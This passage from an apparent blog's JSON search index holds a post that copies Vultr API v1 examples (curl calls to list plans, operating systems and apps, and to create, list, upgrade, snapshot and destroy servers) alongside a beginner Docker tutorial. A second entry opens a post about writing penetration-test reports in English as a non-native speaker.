Plans that are no longer available will not be shown.API Key Required: NoRequest Type: GETExample Request:curl https://api.vultr.com/v1/plans/list?type=vc2Example Response:{ \"1\": { \"VPSPLANID\": \"1\", \"name\": \"Starter\", \"vcpu_count\": \"1\", \"ram\": \"512\", \"disk\": \"20\", \"bandwidth\": \"1\", \"price_per_month\": \"5.00\", \"windows\": false, \"plan_type\": \"SSD\", \"available_locations\": [ 1, 2, 3 ] }, \"2\": { \"VPSPLANID\": \"2\", \"name\": \"Basic\", \"vcpu_count\": \"1\", \"ram\": \"1024\", \"disk\": \"30\", \"bandwidth\": \"2\", \"price_per_month\": \"8.00\", \"windows\": false, \"plan_type\": \"SATA\", \"available_locations\": [], \"deprecated\": true }}Example Parameter--data \"VPSPLANID=201\" = \"VPSPLANID\":\"201\",\"name\":\"1024 MB RAM,25 GB SSD,1.00 TB BW\" (plan)List of all plansList Of All Plans.Operating System/v1/os/listRetrieve a list of available operating systems. If the “windows” flag is true, a Windows license will be included with the instance, which will increase the cost.API Key Required: NoRequest Type: GETExample Request:curl https://api.vultr.com/v1/os/listExample Response:{ \"127\": { \"OSID\": \"127\", \"name\": \"CentOS 6 x64\", \"arch\": \"x64\", \"family\": \"centos\", \"windows\": false }, \"148\": { \"OSID\": \"148\", \"name\": \"Ubuntu 12.04 i386\", \"arch\": \"i386\", \"family\": \"ubuntu\", \"windows\": false }}Example Parameter--data \"OSID=270\" = \"OSID\":270,\"name\":\"Ubuntu 18.04 x64\" (Operating System)List of All Operating SystemsList of all Operating Systems.Application/v1/app/listRetrieve a list of available applications. These refer to applications that can be launched when creating a Vultr VPS.The “surcharge” field is deprecated and will always be set to zero.API Key Required: NoRequest Type: GETExample Request:curl https://api.vultr.com/v1/app/listExample Response:{ \"1\": { \"APPID\": \"1\", \"name\": \"LEMP\", \"short_name\": \"lemp\", \"deploy_name\": \"LEMP on CentOS 6 x64\", \"surcharge\": 0 }, \"2\": { \"APPID\": \"2\", \"name\": \"WordPress\", \"short_name\": \"wordpress\", \"deploy_name\": \"WordPress on CentOS 6 x64\", \"surcharge\": 0 }}Example Parameter--data \"APPID=17\" = \"APPID\":\"17\", \"name\":\"Docker\" (application)Full List of AppsFull List Of Apps.The process in creating the docker container, finding the app id, the dc number, and creating itExample Commandcurl -H \"API-Key: YOURKEY\" https://api.vultr.com/v1/server/create --data \"DCID=8\" --data \"VPSPLANID=201\" --data \"OSID=270\" --data \"APPID=17\" --data \"label=Docker-Server\"--data \"DCID=8\" = \"DCID\":\"8\",\"name\":\"London\" (server region)--data \"VPSPLANID=201\" = \"VPSPLANID\":\"201\",\"name\":\"1024 MB RAM,25 GB SSD,1.00 TB BW\" (plan)--data \"OSID=270\" = \"OSID\":270,\"name\":\"Ubuntu 18.04 x64\" (Operating System)--data \"APPID=17\" = \"APPID\":\"17\", \"name\":\"Docker\" (application)--data \"label=docker-test\" = \"label=Docker-Server\" (server label)Destroy (delete) a virtual machine. All data will be permanently lost, and the IP address will be released. There is no going back from this callExample Request:curl -H 'API-Key: YOURKEY' https://api.vultr.com/v1/server/destroy --data 'SUBID=576965'Used this command to find your SUBID inside your Vultr Account:curl -H 'API-Key: YOURKEY' https://api.vultr.com/v1/server/listExample Response:{ \"576965\": { \"SUBID\": \"576965\", \"os\": \"CentOS 6 x64\", \"ram\": \"4096 MB\", \"disk\": \"Virtual 60 GB\", \"main_ip\": \"123.123.123.123\", \"vcpu_count\": \"2\", \"location\": \"New Jersey\", \"DCID\": \"1\", \"default_password\": \"nreqnusibni\", \"date_created\": \"2013-12-19 14:45:41\", \"pending_charges\": \"46.67\", \"status\": \"active\", \"cost_per_month\": \"10.05\", \"current_bandwidth_gb\": 131.512, \"allowed_bandwidth_gb\": \"1000\", \"netmask_v4\": \"255.255.255.248\", \"gateway_v4\": \"123.123.123.1\", \"power_status\": \"running\", \"server_state\": \"ok\", \"VPSPLANID\": \"28\", \"v6_main_ip\": \"2001:0DB8:1000:0000:0000:000:0000:0101\", \"v6_network_size\": \"64\", \"v6_network\": \"2001:DB8:1000::\", \"v6_networks\": [ { \"v6_network\": \"2001:DB8:1000::\", \"v6_main_ip\": \"2001:0DB8:1000:0000:0000:000:0000:0101\", \"v6_network_size\": \"64\" } ], \"label\": \"my new server\", \"internal_ip\": \"10.99.0.10\", \"kvm_url\": \"https://my.vultr.com/subs/novnc/api.php?data=eawxFVZw2mXnhGUV\", \"auto_backups\": \"yes\", \"tag\": \"mytag\", \"OSID\": \"127\", \"APPID\": \"0\", \"FIREWALLGROUPID\": \"0\" }}Server ListList all active or pending virtual machines on the current account.To determine that a server is ready for use, you may poll /v1/server/list?SUBID=SUBID and check that the “status” field is set to “active”, then test your OS login with SSH (Linux) or RDP (Windows).The “status” field represents the status of the subscription and will be one of pending, active, suspended, or closed. If the status is “active”, you can check “power_status” to determine if the VPS is powered on or not. When status is “active”, you may also use “server_state” for a more detailed status of: none, locked, installingbooting, isomounting, or ok.The “v6_network”, “v6_main_ip”, and “v6_network_size” fields are deprecated in favor of “v6_networks”.The “kvm_url” value will change periodically. It is not advised to cache this value.If you need to filter the list, review the parameters for this function. Currently, only one filter at a time may be applied (SUBID, tag, label, main_ip).API Key Required: YesRequest Type: GETRequired Access: GETcurl -H 'API-Key: YOURKEY' https://api.vultr.com/v1/server/listExample Response:{ \"576965\": { \"SUBID\": \"576965\", \"os\": \"CentOS 6 x64\", \"ram\": \"4096 MB\", \"disk\": \"Virtual 60 GB\", \"main_ip\": \"123.123.123.123\", \"vcpu_count\": \"2\", \"location\": \"New Jersey\", \"DCID\": \"1\", \"default_password\": \"nreqnusibni\", \"date_created\": \"2013-12-19 14:45:41\", \"pending_charges\": \"46.67\", \"status\": \"active\", \"cost_per_month\": \"10.05\", \"current_bandwidth_gb\": 131.512, \"allowed_bandwidth_gb\": \"1000\", \"netmask_v4\": \"255.255.255.248\", \"gateway_v4\": \"123.123.123.1\", \"power_status\": \"running\", \"server_state\": \"ok\", \"VPSPLANID\": \"28\", \"v6_main_ip\": \"2001:0DB8:1000:0000:0000:000:0000:0101\", \"v6_network_size\": \"64\", \"v6_network\": \"2001:DB8:1000::\", \"v6_networks\": [ { \"v6_network\": \"2001:DB8:1000::\", \"v6_main_ip\": \"2001:0DB8:1000:0000:0000:000:0000:0101\", \"v6_network_size\": \"64\" } ], \"label\": \"my new server\", \"internal_ip\": \"10.99.0.10\", \"kvm_url\": \"https://my.vultr.com/subs/novnc/api.php?data=eawxFVZw2mXnhGUV\", \"auto_backups\": \"yes\", \"tag\": \"mytag\", \"OSID\": \"127\", \"APPID\": \"0\", \"FIREWALLGROUPID\": \"0\" }}Changing the plan should you need more spaceUpgrade the plan of a virtual machine. The virtual machine will be rebooted upon a successful upgrade.API Key Required: YesRequest Type: POSTRequired Access: POSTExample:curl -H 'API-Key: YOURKEY' https://api.vultr.com/v1/server/upgrade_plan --data 'SUBID=39960375' --data 'VPSPLANID=29'Saving a snapshot of your machineCreate a snapshot from an existing virtual machine. The virtual machine does not need to be stopped.API Key Required: YesRequest Type: POSTRequired Access: POSTExample Request:curl -H 'API-Key: YOURKEY' https://api.vultr.com/v1/snapshot/create --data 'SUBID=1312965'Example Response:{ \"SNAPSHOTID\": \"544e52f31c706\", \"v2_id\": \"82f4a9f9-6d8b-44c8-ad59-6ade845bd2a6\"}How to Use Docker: Creating Your First Docker ContainerThis tutorial explains the basics of getting started with Docker. I assume that you already have Docker installed. Steps in this tutorial will work on any Linux distribution that is compatible with Docker (CentOS, Ubuntu, etc).Creating your first Docker containerDocker creates virtual containers. Docker’s container system is very efficient because it works with commits. This saves space, and allows you to see changes to the container. For example, if you install Apache in a container, you can create a commit with the name “Installed Apache” so you know exactly what happened.The first thing we’ll do is pull from a repository. Say that you want to install Ubuntu in a container, you can pull Ubuntu from the repository:docker pull ubuntuBe patient, as this can take a while. After everything has been downloaded, you can create a container with this OS:docker run -i -t ubuntu /bin/bashOr with Debian, for example:docker run -i -t debian /bin/bashIf it can’t find the OS (not pulled yet) it will automatically pull it from Docker Hub.Effectively, you now have a container! You are running bash in the slimmed down container that is managed by Docker. Try running some common Linux commands to get a feel for the environment.When you type exit to exit the container and return to your main OS, all of your changes will be gone. To save changes to a container, we use commits.CommitsWhen you create a Docker container, its hostname is automatically generated. For example, when I create a new Ubuntu container, I might get the hostname f7943e42aff0. This is the name that Docker has given to your container.Install what you want on it, and make sure everything works. Then exit your Docker container:exitWe now need to commit; otherwise, all of your changes will be lost.docker commit -a \"William E.\" -m \"Installed Apache\" f7943e42aff0 apachesnapshotThe -a switch can be used to properly determine who authored that commit (who made the changes in the container). -m is the commit message. The f7943e42aff0 is the hostname of my container. In your case it will differ, as Docker generates them randomly. apachesnapshot is the name of your image.You can view a list with all of the images on your local machine. The newest ones are at the top.docker imagesIn order to start your Docker container with the changes, run:docker run -t -i apachesnapshot /bin/bashUsing DockerfilesDockerfiles can be used to make images with applications already installed. This makes it convenient to start a container without having to run a specific command. For example, if we want to create an image with the file ~/file.txt already created, we would use the following Dockerfile:FROM ubuntu:14.04MAINTAINER William E. &lt;william@localhost&gt;RUN touch ~/file.txtIn order to create a Docker container with this Dockerfile, make a folder for your Dockerfile on your local machine (I used ~/files). Put the contents of your Dockerfile in a file called Dockerfile. You can now create an image with it by running:docker build -t=\"test\" .This creates a Docker image from your Dockerfile script. You can now run your container. test is the same value as test in the docker build command.docker run -t -i test /bin/bashWhen the bash shell opens, you’ll see that the ~/file.txt has already been created.This is just a taste of the powerful environments that you can create using Docker. The Docker official manual goes into much further depth on these topics. At this point, you should be able to experiment running existing containers and begin to start imaging your own.You can learn more docker commands and functions here." }, { "title": "Reporting For Non English", "url": "/posts/reporting-english-non-natives/", "categories": "blog", "tags": "reporting, non-english, soft-skills", "date": "2020-01-07 14:00:00 +0000", "snippet": "When looking at the analytics for evilsaint.com, it always surprises me just how wide an audience this website receives! As a native English speaker who dropped foreign language study at the earlie...", "content": "When looking at the analytics for evilsaint.com, it always surprises me just how wide an audience this website receives! As a native English speaker who dropped foreign language study at the earliest opportunity school presented, I am amazed at the number of people around the world who take time to read what I post.I recently was involved in a panel discussing report writing and some of the associated challenges that people face; we talked at length about many topics from learning difficulties, physical handicaps, educational issues, and language comprehension.While the panel discussions sparked many topics, one particular interesting share of note (or at least I felt so), was from a non-native English speaker who has been writing penetration testing reports in English for over six years.This person gave the perspective of how they write reports, stating that they often make mistakes when they try and do literal translations from their native language into English. They gave examples and pointed out commonly confused items. Upon asking how they circumvented this problem, they directed me to a resource online which I will now share with you (Please see references below)This document has assembled many misused English words and expressions that have appeared in EU publications and discusses the correct usage. Even if English is your native language, you might learn something, and I encourage you to do so." } ]
